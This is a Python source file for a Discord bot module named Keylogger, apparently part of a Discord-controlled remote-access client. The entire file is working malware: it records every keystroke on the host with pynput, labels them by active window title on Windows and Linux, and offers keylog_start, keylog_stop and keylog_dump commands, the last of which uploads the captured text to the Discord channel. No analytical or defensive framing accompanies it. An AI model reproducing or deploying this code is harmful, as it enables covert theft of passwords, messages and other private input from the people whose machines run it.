import os
import discord
from discord.ext import commands
from pynput import keyboard
import threading
import time
from datetime import datetime
from src.client.core.platform import Platform

class Keylogger(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.log_buffer = ""
        self.is_logging = False
        self.listener = None
        self.current_window = ""
        
    def get_active_window(self):
        """Try to get the active window title in a cross-platform way."""
        try:
            if Platform.is_windows():
                import pygetwindow as gw
                window = gw.getActiveWindow()
                return window.title if window else "Unknown"
            elif Platform.is_linux():
                # Basic Linux implementation using xdotool if available
                import subprocess
                result = subprocess.run(["xdotool", "getactivewindow", "getwindowname"], 
                                     capture_output=True, text=True, timeout=1)
                return result.stdout.strip() if result.returncode == 0 else "Linux Window"
            return "N/A"
        except:
            return "N/A"

    def on_press(self, key):
        if not self.is_logging:
            return False
            
        try:
            # Track window changes
            active_window = self.get_active_window()
            if active_window != self.current_window:
                self.current_window = active_window
                self.log_buffer += f"\n\n--- [Window: {self.current_window}] ---\n"

            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                self.log_buffer += key.char
            else:
                k = str(key).replace("Key.", "")
                if k == "space":
                    self.log_buffer += " "
                elif k == "enter":
                    self.log_buffer += "\n"
                elif k == "backspace":
                    self.log_buffer += " [BACKSPACE] "
                else:
                    self.log_buffer += f" [{k.upper()}] "
        except Exception as e:
            pass

    @commands.command(name="keylog_start", help="Start the keylogger.")
    async def start_logging(self, ctx):
        if self.is_logging:
            await ctx.send("⚠️ Keylogger is already running.")
            return

        self.is_logging = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        await ctx.send("✅ Keylogger started.")

    @commands.command(name="keylog_stop", help="Stop the keylogger.")
    async def stop_logging(self, ctx):
        if not self.is_logging:
            await ctx.send("⚠️ Keylogger is not running.")
            return

        self.is_logging = False
        if self.listener:
            self.listener.stop()
        await ctx.send("🛑 Keylogger stopped.")

    @commands.command(name="keylog_dump", help="Dump the current keylogs.")
    async def dump_logs(self, ctx):
        if not self.log_buffer:
            await ctx.send("📝 No logs captured yet.")
            return

        # Discord has a 2000 character limit, so we send it as a file
        log_file = f"keylogs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(self.log_buffer)

        discord_file = discord.File(log_file)
        await ctx.send(f"📄 Keylogs for {ctx.author.name}:", file=discord_file)
        
        # Clean up local file
        os.remove(log_file)
        # Optional: Clear buffer after dump
        # self.log_buffer = ""

async def setup(bot):
    await bot.add_cog(Keylogger(bot))
